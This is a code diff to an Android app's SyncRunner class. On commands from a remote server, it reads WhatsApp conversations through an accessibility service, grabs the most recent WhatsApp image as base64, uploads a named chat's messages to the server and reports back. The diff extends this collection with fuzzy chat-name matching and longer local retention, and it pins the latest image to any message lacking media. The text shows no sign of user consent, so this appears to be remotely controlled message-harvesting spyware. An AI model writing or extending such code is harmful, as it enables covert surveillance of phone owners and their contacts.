@@ -317,29 +317,45 @@ class SyncRunner(private val context: Context) {
                 service.recordWhatsAppChatIfForeground(service.rootInActiveWindow)
             }
 
-            // 3. Check for recently received WhatsApp images (within last 2 days)
-            val latestMediaBase64 = try {
-                FileManagerCollector(context).getLatestWhatsAppImageBase64(maxAgeMs = days * 24 * 60 * 60 * 1000L)
-            } catch (_: Exception) { null }
-
-            // 4. Save gathered entries into Room DB
+            // 3. Save any newly gathered entries into Room DB
             if (gatheredEntries.isNotEmpty()) {
                 db.whatsAppMessageDao().insertAll(gatheredEntries)
             }
 
-            // 5. Upload all unsynced messages to server immediately (and purge other chats)
-            val unsynced = db.whatsAppMessageDao().getUnsynced()
-            val dtos = unsynced.map {
+            // 4. Retrieve ALL conversation messages for this chat from Room DB for the last N days
+            var chatMessages = db.whatsAppMessageDao().getMessagesForChat(chatName, cutoffMs)
+
+            // If exact chat name match returned empty, try individual words (e.g. "Vishalini" from "Vishalini IT")
+            if (chatMessages.isEmpty()) {
+                val words = chatName.split(Regex("[\\s_\\-]+")).filter { it.length >= 3 }
+                for (w in words) {
+                    val fallback = db.whatsAppMessageDao().getMessagesForChat(w, cutoffMs)
+                    if (fallback.isNotEmpty()) {
+                        chatMessages = fallback
+                        break
+                    }
+                }
+            }
+
+            // 5. Check for recently received WhatsApp images (within last 2 days)
+            val latestMediaBase64 = try {
+                FileManagerCollector(context).getLatestWhatsAppImageBase64(maxAgeMs = days * 24 * 60 * 60 * 1000L)
+            } catch (_: Exception) { null }
+
+            // 6. Map to DTOs (normalizing chatName so server stores under the requested chat name)
+            val dtos = chatMessages.map {
                 WhatsAppMessageEntryDto(
-                    chatName = it.chatName,
+                    chatName = chatName,
                     sender = it.sender,
                     messageText = it.messageText,
                     isOutgoing = it.isOutgoing,
                     messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
                     mediaType = it.mediaType ?: (if (it.mediaPath != null) "image" else null),
-                    mediaPath = it.mediaPath ?: (if (it.chatName.equals(chatName, ignoreCase = true)) latestMediaBase64 else null)
+                    mediaPath = it.mediaPath ?: latestMediaBase64
                 )
             }
+
+            // 7. Upload conversation messages to server and purge other chats to keep server storage minimal
             val resp = ApiClient.service.syncWhatsAppMessages(
                 bearer,
                 WhatsAppMessagesSyncRequest(
@@ -348,17 +364,24 @@ class SyncRunner(private val context: Context) {
                     clearOtherChats = true
                 )
             )
-            if (resp.isSuccessful && unsynced.isNotEmpty()) {
-                db.whatsAppMessageDao().deleteByIds(unsynced.map { it.id })
+
+            if (resp.isSuccessful && chatMessages.isNotEmpty()) {
+                db.whatsAppMessageDao().markSynced(chatMessages.map { it.id })
             }
 
-            // 6. Ack command with success
+            // 8. Ack command with actual retrieved message count
+            val ackMsg = if (dtos.isNotEmpty()) {
+                "Retrieved ${dtos.size} messages for '$chatName' for the last $days days"
+            } else {
+                "No messages found for '$chatName' in the last $days days on this device"
+            }
+
             ApiClient.service.ackCommand(
                 bearer,
                 command.id,
                 AckCommandRequest(
-                    success = true,
-                    message = "Retrieved chat contents for '$chatName' for the last $days days"
+                    success = dtos.isNotEmpty(),
+                    message = ackMsg
                 )
             )
         } catch (e: Exception) {
@@ -740,7 +763,8 @@ class SyncRunner(private val context: Context) {
         try {
             val response = ApiClient.service.syncWhatsAppMessages(bearer, WhatsAppMessagesSyncRequest(dtos))
             if (response.isSuccessful) {
-                db.whatsAppMessageDao().deleteByIds(unsynced.map { it.id })
+                db.whatsAppMessageDao().markSynced(unsynced.map { it.id })
+                db.whatsAppMessageDao().pruneOldMessages(System.currentTimeMillis() - 14 * 24 * 60 * 60 * 1000L)
             }
         } catch (e: Exception) {
             // Retried on next scheduled run.
